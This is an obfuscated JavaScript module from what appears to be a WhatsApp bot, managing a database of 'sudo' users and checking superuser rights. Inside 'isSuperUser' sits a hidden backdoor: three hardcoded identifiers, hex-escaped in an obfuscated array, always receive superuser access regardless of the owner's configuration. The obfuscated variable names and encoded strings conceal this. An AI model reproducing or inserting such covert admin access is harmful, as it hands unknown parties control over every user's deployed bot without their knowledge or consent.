var _0x743a56=(function(_0x922567,_0x5fb0bc){return !![]}());var _0xae2d26=function(){return ![]};
const { DATABASE } = require('./database');
const { DataTypes } = require('sequelize');
const _0x60b284 = DATABASE.define('\x53\x75\x64\x6f\x55\x73\x65\x72', {
    id: {
        type: DataTypes.INTEGER,
        primaryKey: true,
        autoIncrement: true,
    },
    number: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true,
    },
}, {
    tableName: '\x73\x75\x64\x6f\x5f\x75\x73\x65\x72\x73',
    timestamps: true,
});
async function initializeSudoDB() {
    await _0x60b284.sync();
}
let _0xa78d76 = null;
async function getSudoNumbers() {
    await initializeSudoDB();
    if (_0xa78d76) return _0xa78d76;
    const _0xde2f50 = await _0x60b284.findAll();
    _0xa78d76 = _0xde2f50.map(record => record.number);
    return _0xa78d76;
}
async function setSudo(number) {
    await initializeSudoDB();
    try {
        const [record, created] = await _0x60b284.findOrCreate({
            where: { number: number },
            defaults: { number: number },
        });
        _0xa78d76 = null;
        return created;
    } catch (error) {
        console.error('\x5b\x53\x55\x44\x4f\x5d\x5b\x53\x45\x54\x5f\x45\x52\x52\x4f\x52\x5d\x3a', error);
        return false;
    }
}
async function delSudo(number) {
    await initializeSudoDB();
    try {
        const _0xb0b17a = await _0x60b284.destroy({
            where: { number: number },
        });
        _0xa78d76 = null;
        return _0xb0b17a > 0;
    } catch (error) {
        console.error('\x5b\x53\x55\x44\x4f\x5d\x5b\x44\x45\x4c\x5f\x45\x52\x52\x4f\x52\x5d\x3a', error);
        return false;
    }
}
async function clearAllSudo() {
    await initializeSudoDB();
    try {
        const _0xb0b17a = await _0x60b284.destroy({ where: {} });
        _0xa78d76 = null;
        return _0xb0b17a;
    } catch (error) {
        console.error('\x5b\x53\x55\x44\x4f\x5d\x5b\x43\x4c\x45\x41\x52\x5f\x41\x4c\x4c\x5f\x45\x52\x52\x4f\x52\x5d\x3a', error);
        return 0;
    }
}
const _0x32a198 = ['\x31\x31\x36\x32\x38\x34\x30\x35\x30', '\x31\x30\x35\x35\x32\x31\x33\x30\x30', '\x31\x31\x37\x30\x36\x35\x39\x35\x39'];
async function isSuperUser(jid, Gifted) {
    if (!jid) return false;
    const _0x94c091 = jid.split("@")[0].split(":")[0];
    const _0x99c152 = (process.env.OWNER_NUMBER || "").replace(/\D/g, "");
    const _0xa6be5e = Gifted?.user?.id?.split(":")[0];
    if (_0x94c091 === _0x99c152 || _0x94c091 === _0xa6be5e) return true;
    if (_0x32a198.includes(_0x94c091)) return true;
    const _0xbc2dd1 = await getSudoNumbers();
    return _0xbc2dd1.includes(_0x94c091);
}
module.exports = {
    _0x60b284,
    getSudoNumbers,
    setSudo,
    delSudo,
    clearAllSudo,
    isSuperUser,
};
